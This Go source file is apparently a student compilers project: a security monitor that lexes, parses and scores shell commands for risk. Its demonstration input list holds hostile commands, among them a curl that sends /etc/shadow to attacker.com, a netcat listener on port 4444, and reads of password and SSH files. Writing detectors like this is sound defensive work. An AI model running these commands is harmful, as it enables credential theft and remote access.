package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"security-monitor/internal/lexer"
	"security-monitor/internal/parser"
	"security-monitor/internal/semantic"
	"security-monitor/internal/models"
)

type SecurityMonitor struct {
	lexer    *lexer.Lexer
	parser   *parser.Parser
	semantic *semantic.Analyzer
}

func NewSecurityMonitor() *SecurityMonitor {
	return &SecurityMonitor{
		lexer:    lexer.New(),
		parser:   parser.New(),
		semantic: semantic.New(),
	}
}

func (sm *SecurityMonitor) ProcessCommand(command string, user string, timestamp time.Time) (*models.AnalysisResult, error) {
	// Fase 1: Análisis Léxico
	tokens, err := sm.lexer.Tokenize(command)
	if err != nil {
		return nil, fmt.Errorf("error en análisis léxico: %w", err)
	}

	// Fase 2: Análisis Sintáctico
	ast, err := sm.parser.Parse(tokens)
	if err != nil {
		return nil, fmt.Errorf("error en análisis sintáctico: %w", err)
	}

	// Fase 3: Análisis Semántico
	result, err := sm.semantic.Analyze(ast, user, timestamp)
	if err != nil {
		return nil, fmt.Errorf("error en análisis semántico: %w", err)
	}

	return result, nil
}

func (sm *SecurityMonitor) MonitorCommands(commandChan <-chan models.CommandInput) {
	for cmd := range commandChan {
		result, err := sm.ProcessCommand(cmd.Command, cmd.User, cmd.Timestamp)
		if err != nil {
			log.Printf("Error procesando comando: %v", err)
			continue
		}

		if result.RiskScore >= models.HighRiskScore {
			sm.handleHighRiskAlert(result)
		}

		sm.logResult(result)
	}
}

func (sm *SecurityMonitor) handleHighRiskAlert(result *models.AnalysisResult) {
	fmt.Printf("🚨 ALERTA DE ALTA PRIORIDAD 🚨\n")
	fmt.Printf("Usuario: %s\n", result.User)
	fmt.Printf("Comando: %s\n", result.OriginalCommand)
	fmt.Printf("Nivel de Riesgo: %s\n", result.RiskLevel)
	fmt.Printf("Puntuación: %.2f\n", result.RiskScore)
	fmt.Printf("Razones: %v\n", result.Reasons)
	fmt.Printf("Timestamp: %s\n", result.Timestamp.Format(time.RFC3339))
	fmt.Println(strings.Repeat("-", 50))
}

func (sm *SecurityMonitor) logResult(result *models.AnalysisResult) {
	if result.RiskScore > models.LowRiskScore {
		log.Printf("Usuario: %s | Comando: %s | Riesgo: %s (%.2f)",
			result.User, result.OriginalCommand, result.RiskLevel, result.RiskScore)
	}
}

func main() {
	fmt.Println("🔍 Sistema de Monitoreo de Seguridad - Compiladores")
	fmt.Println("Iniciando análisis de comandos...")

	monitor := NewSecurityMonitor()
	
	// Interfaz interactiva mejorada
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println("\nIngresa comandos para analizar (escribe 'exit' para salir):")

	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "exit" {
			break
		}

		if input == "" {
			continue
		}

		// Procesar comando en tiempo real
		result, err := monitor.ProcessCommand(input, "usuario_test", time.Now())
		if err != nil {
			fmt.Printf("❌ Error: %v\n", err)
			continue
		}

		// Mostrar resultado con formato mejorado
		fmt.Printf("\n📊 Análisis completado:\n")
		fmt.Printf("  🎯 Comando: %s\n", result.OriginalCommand)
		fmt.Printf("  👤 Usuario: %s\n", result.User)
		fmt.Printf("  ⚠️  Nivel de Riesgo: %s\n", result.RiskLevel)
		fmt.Printf("  📈 Puntuación: %.2f\n", result.RiskScore)
		
		if len(result.ThreatCategories) > 0 {
			fmt.Printf("  🚨 Categorías de Amenaza: %v\n", result.ThreatCategories)
		}
		
		if len(result.Reasons) > 0 {
			fmt.Printf("  💡 Razones: %v\n", result.Reasons)
		}
		
		if len(result.Recommendations) > 0 {
			fmt.Printf("  🔧 Recomendaciones: %v\n", result.Recommendations)
		}
		
		if result.IsBlocked {
			fmt.Printf("  🚫 COMANDO BLOQUEADO\n")
		}
		
		fmt.Printf("  ⏱️  Tiempo de procesamiento: %v\n", result.ProcessingTime)
		fmt.Println()
	}

	fmt.Println("Sistema de monitoreo detenido.")
}

func simulateCommandInput(commandChan chan<- models.CommandInput) {
	// Comandos de ejemplo para demostración
	testCommands := []string{
		"ls -la /home",
		"sudo cat /etc/passwd",
		"find / -name '*.ssh' 2>/dev/null",
		"nc -l -p 4444",
		"chmod 777 /tmp/backdoor",
		"curl -X POST https://attacker.com/exfil -d @/etc/shadow",
		"whoami && id && uname -a",
		"ps aux | grep ssh",
	}

	for i, cmd := range testCommands {
		time.Sleep(2 * time.Second)
		commandChan <- models.CommandInput{
			Command:   cmd,
			User:      fmt.Sprintf("user%d", i%3),
			Timestamp: time.Now(),
		}
	}
}